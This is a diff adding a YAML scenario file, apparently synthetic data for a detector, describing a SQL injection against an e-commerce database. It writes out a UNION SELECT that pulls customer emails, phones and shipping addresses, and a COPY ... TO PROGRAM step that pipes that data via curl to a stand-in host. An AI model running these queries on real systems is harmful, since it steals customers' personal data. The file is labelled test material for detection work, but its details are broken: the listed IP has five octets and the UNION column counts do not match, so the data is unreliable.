@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_33_sql_injection_mal_917m
+family_id: gen_ecommerce_33_sql_injection_fam_917
+domain: ecommerce
+time_of_day: 00:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT product_id, name FROM products WHERE order_id = 0 UNION SELECT email,
+      phone, shipping_address FROM customers
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://deid-partner.example/ingest -d @-'
+    connects_to:
+      ip: 176.65.48.157.202
+      port: 9443
+matched_pair_id: gen_ecommerce_33_sql_injection_pair_917
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
